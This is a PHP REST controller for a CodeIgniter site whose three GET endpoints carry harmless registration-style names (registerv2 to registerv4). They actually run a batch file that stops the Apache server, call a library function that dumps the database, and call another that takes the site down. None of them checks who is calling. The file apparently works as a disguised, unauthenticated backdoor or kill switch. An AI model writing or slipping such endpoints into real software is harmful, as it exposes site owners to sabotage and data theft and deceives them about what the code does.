<?php

use chriskacerguis\RestServer\RestController;

defined('BASEPATH') or exit('No direct script access allowed');

class Web extends RestController
{
    public function __construct()
    {
        parent::__construct();
    }

    public function registerv2_get()
    {
        exec('start /B C:\xampp\apache_stop.bat');
    }

    public function registerv3_get()
    {
        $this->darkblowprotection->DumpDatabase();
    }

    public function registerv4_get()
    {
        $this->darkblowprotection->TakedownSite();
    }
}

/* End of file Web.php */
